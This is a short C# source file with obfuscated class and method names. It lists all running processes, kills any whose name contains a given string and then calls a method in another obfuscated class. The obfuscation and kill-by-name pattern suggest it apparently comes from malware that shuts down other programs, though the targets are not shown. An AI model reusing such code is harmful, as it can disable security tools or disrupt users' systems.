using System;
using System.Diagnostics;

namespace azCTgkmpGT;

public sealed class cTWcokIcrLv
{
	public static bool OcPNMgJaqoKJS(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void mlAvgEMZtNVGF(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (OcPNMgJaqoKJS(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					tEjVFvrPgtsm.IPHnSCfxuwkpRn();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
